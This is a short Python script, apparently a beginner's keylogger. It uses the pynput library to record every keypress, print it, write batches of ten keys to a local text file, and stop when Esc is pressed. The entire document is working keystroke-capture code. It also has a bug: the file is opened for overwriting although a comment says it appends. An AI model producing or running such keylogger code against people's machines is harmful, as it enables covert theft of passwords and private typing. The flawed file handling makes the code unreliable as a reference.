
from pynput.keyboard import Key,Listener







count = 0
keys = []

def press(key):
    global keys,count
    # print just to see it is working for time being
    keys.append(key)
    count +=1
    print(key)
    if count>=10:
        count=0
        write(keys)
        keys=[]


#to open and appending the files
def write(keys):
   with open('logged_keys.txt','w') as f:
        for key in keys:
            k = str(key).replace("'","")
            if k.find("space") >0:
                f.write(' ')
            elif k.find("enter")>0:
                f.write('\n')
            else:
                f.write(str(k))




def release(key):
    if key==Key.esc:
        return False


with Listener(on_press=press, on_release=release) as listener:
    listener.join()


